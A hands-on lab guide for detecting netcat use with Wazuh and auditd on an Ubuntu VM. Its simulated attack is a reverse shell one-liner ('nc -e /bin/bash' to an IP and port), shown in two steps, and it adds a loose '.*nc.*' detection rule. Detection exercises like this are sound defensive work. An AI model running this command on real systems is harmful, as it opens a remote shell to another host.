🛡️ Suspicious Command Detection (Simulated Attack)

 🔍 Overview

In this exercise, we simulate a suspicious command execution using `netcat` (`nc`), a common tool leveraged by attackers to establish reverse shells or transfer files. We'll use Wazuh to detect and generate alerts when such commands are executed on a monitored system.


 ⚙️ Environment Setup

Operating System: Ubuntu (Virtual Machine)
Monitoring Tool: Wazuh 4.12.0
Log Source: auditd (Linux Audit Daemon)

Ensure your Wazuh manager and dashboard are properly installed and accessible.


## 🧪 Step 1: Install and Configure `auditd`

Auditd logs system-level events, including command executions.

```bash
sudo apt update
sudo apt install auditd -y
sudo systemctl enable auditd
sudo systemctl start auditd
```

## Step 2: Simulate a Suspicious Command
```bash
nc -e /bin/bash 192.168.1.100 4444
```
🛑 Replace 192.168.1.100 with a dummy IP. This test is harmless in a VM and is used to generate a detection event.


## Step 3: Configure Wazuh to Monitor audit.log
Edit the Wazuh manager config to read from auditd logs:
```bash
sudo nano /var/ossec/etc/ossec.conf
```
Add this block inside the <ossec_config> tag:

xml
<localfile>
  <log_format>audit</log_format>
  <location>/var/log/audit/audit.log</location>
</localfile>


Save and restart the Wazuh manager:

```bash
sudo systemctl restart wazuh-manager
```

## 📏 Step 4: Create a Custom Rule to Detect nc
Edit your local rules file:

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
```
Add the following custom rule:
xml
<group name="auditd,suspicious_commands,">
  <rule id="100101" level="10">
    <decoded_as>auditd</decoded_as>
    <field name="command">.*nc.*</field>
    <description>Suspicious command detected: netcat usage</description>
  </rule>
</group>
Restart the Wazuh manager:

```bash
sudo systemctl restart wazuh-manager
```


###📈 Step 5: Validate in Wazuh Dashboard
Re-run the test command:

```bash
nc -e /bin/bash 192.168.1.100 4444
```
Log in to the Wazuh dashboard.
Go to Security Events → Rules.
Search for:
Rule ID: 100101
Description: Suspicious command detected: netcat usage


